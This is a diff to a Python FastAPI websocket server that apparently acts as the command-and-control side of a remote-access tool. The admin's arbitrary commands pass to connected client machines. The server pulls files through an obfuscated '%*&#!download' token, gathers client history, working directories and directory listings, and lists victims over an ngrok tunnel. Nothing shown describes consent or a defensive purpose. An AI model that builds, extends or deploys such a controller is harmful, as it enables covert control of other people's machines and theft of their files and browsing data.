@@ -1,11 +1,12 @@
 import asyncio
+import time
 
 from fastapi import FastAPI, WebSocket
 # from fastapi.security import APIKeyHeader
 from starlette.middleware.cors import CORSMiddleware
 from starlette.websockets import WebSocketDisconnect
 
-from utils import receive_file, is_client_admin
+from utils import receive_file, is_client_admin, today
 
 # app
 app = FastAPI(
@@ -29,30 +30,41 @@ admin_websocket = None
 
 
 async def select_client_to_interact_with(websocket: WebSocket):
-    message = "Connected Clients:\n"
+    message = {}
+    message["clients"] = []
     for i, (client_id, client_ws) in enumerate(clients.items()):
-        message += f"{i + 1} - {client_ws.client.host}:{client_ws.client.port} (Client ID: {client_id})\n"
+        # Create a dictionary to hold client information
+        client_info = {"client_id": str(client_id),
+                       "address": f"{client_ws.client.host}:{client_ws.client.port}"
+                       }
+        message["clients"].append(client_info)
 
-    message += "Note! Reply with the number of the client you want to interact with. (zero '0' for Refresh)"
-    await websocket.send_text(message)
+    message["message"] = "Note! Reply with the client_id you want to interact with. (zero '0' for Refresh)"
+    await websocket.send_json(message)
 
     data = await websocket.receive_text()
     return data
 
 
 async def handle_client_interaction(client_websocket: WebSocket, admin_websocket: WebSocket):
+    # print(f"Interacting with Client {selected_client_id} {client_ws.client.host}:{client_ws.client.port}")
     print(f"Connected by {client_websocket.client.host}:{client_websocket.client.port}")
 
     first_time = True
     try:
         while True:
             if first_time:
-                await admin_websocket.send_text(f"activate the status (0,1)")
                 await client_websocket.send_text("1")
                 first_time = False
                 continue
 
-            command = await admin_websocket.receive_text()
+            try:
+                command = await admin_websocket.receive_text()
+                # Process the received command
+            except Exception as e:
+                await client_websocket.send_text("switch")
+                time.sleep(0.005)
+                return True
 
             # want to wait until active again
             if command.lower().startswith('switch'):
@@ -60,14 +72,17 @@ async def handle_client_interaction(client_websocket: WebSocket, admin_websocket
                 return True
             elif command.lower().startswith('download'):
                 _, filename = command.split(' ', 1)
+                cmd = "%*&#!download"
                 filepath = f"{filename}"
-                command = f"download {filepath}"
+                command = f"{cmd} {filepath}"
                 await client_websocket.send_text(command)
                 continue
 
             await client_websocket.send_text(command)
 
-    except WebSocketDisconnect:
+    except WebSocketDisconnect as e:
+        code, reason = e.args
+        print(f"WebSocket disconnected with code: {code}, reason: {reason}")
         print(f"Connection with {client_websocket.client.host} disconnected.")
         return False
     except Exception as e:
@@ -87,47 +102,91 @@ async def websocket_endpoint_client(websocket: WebSocket):
         while True:
             client_data = await websocket.receive_text()
 
-            if client_data.lower().startswith('download'):
+            if client_data.lower().startswith('%*&#!download'):
                 print("receive file")
                 _, filename = client_data.split(' ', 1)
                 # Use asyncio to concurrently receive file in the background
                 response = await asyncio.create_task(receive_file(websocket, filename))
-                await admin_websocket.send_text(f"Client {client_id}: {response}")
+                await admin_websocket.send_json({"client": client_id, "response": str(response)})
                 continue
 
             elif client_data.lower().startswith('history'):
                 hist = await websocket.receive_json()
-                data = {"Client": client_id,
+                data = {"client": client_id,
+                        "today": today(),
                         "hist": hist}
                 await admin_websocket.send_json(data)
                 continue
 
-            await admin_websocket.send_text(f"Client {client_id}: {client_data}")
+            elif client_data.lower().startswith('cwd%`'):
+                cwd = client_data[5:]
+                client_data = await websocket.receive_json()
+                await admin_websocket.send_json({"client": client_id, "cwd": cwd, "client_data": client_data})
+                continue
+
+            elif client_data.lower().startswith("ls"):
+                client_data = await websocket.receive_json()
+                await admin_websocket.send_json({"client": client_id, "response": client_data})
+                continue
+
+            await admin_websocket.send_json({"client": client_id, "response": client_data})
     except:
-        del clients[client_id]
+        pass
+        # del clients[client_id]
 
 
 @app.websocket("/ws-remote-access/admin")
-async def websocket_endpoint(websocket: WebSocket, api_key: str | None):
+async def websocket_endpoint(websocket: WebSocket, api_key: str | None, client_id: int | None):
     global admin_websocket
     admin_websocket = websocket
     await websocket.accept()
+    max_client_id = len(clients)
+    if client_id is None or (client_id <= 0) or (client_id > max_client_id):
+        await websocket.send_text(
+            "Please provide a valid client_id to connect with \nFind details: https://0.tcp.ap.ngrok.io:<enter-port>/get-clients")
+        await admin_websocket.close(code=1000)  # Close the WebSocket connection gracefully
+        return
     if await is_client_admin(api_key):
-        while True:
-            data = await select_client_to_interact_with(websocket)
-            if int(data) == 0:
-                continue
-            try:
-                selected_index = int(data) - 1
+        switched = False
+        try:
+            while not switched:
+                # client_id = await select_client_to_interact_with(websocket)
+                selected_index = int(client_id) - 1
                 if 0 <= selected_index < len(clients):
                     selected_client_id = list(clients.keys())[selected_index]
                     client_ws = clients[selected_client_id]
-                    await websocket.send_text(
-                        f"Interacting with Client {selected_client_id} {client_ws.client.host}:{client_ws.client.port}")
 
                 while await handle_client_interaction(client_ws, websocket):
+                    switched = True
                     break
-            except KeyboardInterrupt:
-                print("Server terminated by the user.")
-            # except Exception as e:
-            #     print("Server Error: ", str(e))
+        except KeyboardInterrupt:
+            print("Server terminated by the user.")
+        except WebSocketDisconnect as e:
+            code, reason = e.args
+            print(f"WebSocket disconnected with code: {code}, reason: {reason}")
+            print(f"Connection with {websocket.client.host} disconnected.")
+        except Exception as e:
+            print("Server Error: ", str(e))
+
+
+@app.get("/get-clients")
+async def test():
+    message = {}
+    message["clients"] = []
+    for i, (client_id, client_ws) in enumerate(clients.items()):
+        # Create a dictionary to hold client information
+        client_info = {"client_id": str(i+1),
+                       "address": f"{client_ws.client.host}:{client_ws.client.port}"
+                       }
+        message["clients"].append(client_info)
+    return message
+
+
+if __name__ == "__main__":
+    import uvicorn
+
+    uvicorn.run(app, host="127.0.0.1", port=8000, ssl_keyfile='./server.key',
+                ssl_certfile='./server.crt',
+                log_level="info")
+
+    # uvicorn.run(app, host="127.0.0.1", port=8000, log_level="info")
